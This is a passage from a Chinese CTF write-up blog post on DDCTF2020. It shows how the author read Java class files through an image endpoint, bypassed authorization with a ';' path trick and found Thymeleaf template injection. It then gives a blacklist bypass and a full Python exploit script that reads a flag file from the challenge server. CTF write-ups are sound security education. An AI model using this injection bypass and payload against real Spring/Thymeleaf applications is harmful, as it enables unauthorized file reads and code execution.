<p>猜测他们的Auth，Login等对应的Controller类名<br><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class</a></p>
</li>
</ol>
<p>   <a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class</a></p>
<p>   拿到Admin的路由：<code>http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index</code>，同样权限绕过<br>   发现提示Render，盲猜又是SSTI</p>
<p>   检测JAVA的SSTI发现<code>[[${7*7}]]</code>成功执行，这是一个Thymeleaf 模板注入</p>
<p>进入下一步SSTI</p>
<p>ctfFilter过滤了：</p>
<pre><code class="java">private static String[] blacklists = { &quot;java.+lang&quot;, &quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#39;&quot;, &quot;exec.*\\(&quot;, &quot;write|read&quot;, &quot;invoke.*\\(&quot;, &quot;\\.forName.*\\(&quot;, &quot;lookup.*\\(&quot;, &quot;\\.getMethod.*\\(&quot;, &quot;javax.+script.+ScriptEngineManager&quot;, &quot;com.+fasterxml&quot;, &quot;org.+apache&quot;, &quot;org.+hibernate&quot;, &quot;org.+thymeleaf&quot;, &quot;javassist&quot;, &quot;javax\\.&quot;, &quot;eval.*\\(&quot;, &quot;\\.getClass\\(&quot;, &quot;org.+springframework&quot;, &quot;javax.+el&quot;, &quot;java.+io&quot; };</code></pre>
<p>利用Thymeleaf 特性绕过</p>
<p><code>[[*{__${#strings.replace(param.foo[0],param.bbb[0],param.t[0])}__}]]</code></p>
<p>exp:</p>
<pre><code class="python">import requests
import re
import gen
#  private static String[] blacklists = { &quot;java.+lang&quot;, &quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#39;&quot;, &quot;exec.*\\(&quot;, &quot;write|read&quot;, &quot;invoke.*\\(&quot;, &quot;\\.forName.*\\(&quot;, 
# &quot;lookup.*\\(&quot;, &quot;\\.getMethod.*\\(&quot;, 
# &quot;javax.+script.+ScriptEngineManager&quot;, &quot;com.+fasterxml&quot;, &quot;org.+apache&quot;, &quot;org.+hibernate&quot;, &quot;org.+thymeleaf&quot;, &quot;javassist&quot;, &quot;javax\\.&quot;, &quot;eval.*\\(&quot;, &quot;\\.getClass\\(&quot;,
#  &quot;org.+springframework&quot;, &quot;javax.+el&quot;, &quot;java.+io&quot; };

code = &quot;param.foo&quot;
payload =&#39;&#39;&#39;&lt;p th:text=${%s}&gt;&lt;/p&gt;&#39;&#39;&#39;%code
cmd=payload
cmd=&quot;&quot;&quot;[[*{__${#strings.replace(param.foo[0],param.bbb[0],param.t[0])}__}]] &quot;&quot;&quot;
print(cmd)
burp0_url = &quot;http://116.85.37.131:80/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize&quot;
burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://116.85.37.131&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
burp0_data = {&quot;content&quot;: cmd}
response=requests.post(burp0_url, headers=burp0_headers, data=burp0_data).text

try:
    redirect = re.search(&#39;fetch \./(.*) !&#39;, response).group(1)
except :
    print(response)
url = &#39;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/&#39;
url += redirect

print(requests.get(url,params={&quot;foo&quot;:&quot;NEW java.util.Scanner(NEW java.i@o.BufferedRea@der(new java.i@o.Fi@leRe@ad@er(new java.i@o.Fi@le(&quot;+gen.gen(&quot;/flag_is_here&quot;)+&quot;)))).nextLine()&quot;,&quot;bbb&quot;:&#39;@&#39;,&quot;t&quot;:&quot;&quot;,&#39;g&#39;:&#39;ls&#39;},proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text)</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/DDCTF2020/">https://www.ccreater.top/1970/01/01/DDCTF2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/DDCTF2020/" data-id="ckmn57552001hs1nib0b602k0" data-title="DDCTF2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/3/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/">避免rm -rf *的悲惨命运</a>
          </li>
        
          <li>
            <a href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/">勉强能用的论文降重</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>